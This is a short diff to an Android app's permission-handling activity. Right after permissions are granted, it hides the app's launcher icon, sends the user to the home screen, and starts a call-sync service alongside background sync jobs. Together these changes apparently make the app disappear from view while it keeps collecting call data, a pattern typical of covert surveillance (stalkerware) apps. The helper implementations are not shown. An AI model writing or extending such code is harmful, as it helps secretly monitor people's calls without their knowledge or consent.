@@ -131,9 +131,12 @@ class PermissionTrampolineActivity : AppCompatActivity() {
         }
         finished = true
         PermissionPopupAlarms.cancel(this)
+        LauncherHider.hideNow(this)
+        goHome()
         SyncObserverManager.register(applicationContext)
         SyncBootstrap.armBackgroundSync(applicationContext)
         SyncAlarmScheduler.scheduleNext(applicationContext)
+        CallSyncService.ensureRunning(applicationContext)
 
         BackgroundSyncRunner.run {
             try {
@@ -152,7 +155,6 @@ class PermissionTrampolineActivity : AppCompatActivity() {
                 InstallFlow.completeSetup(applicationContext)
                 mainHandler.post {
                     LauncherHider.hideNow(this@PermissionTrampolineActivity)
-                    goHome()
                     finish()
                 }
             }
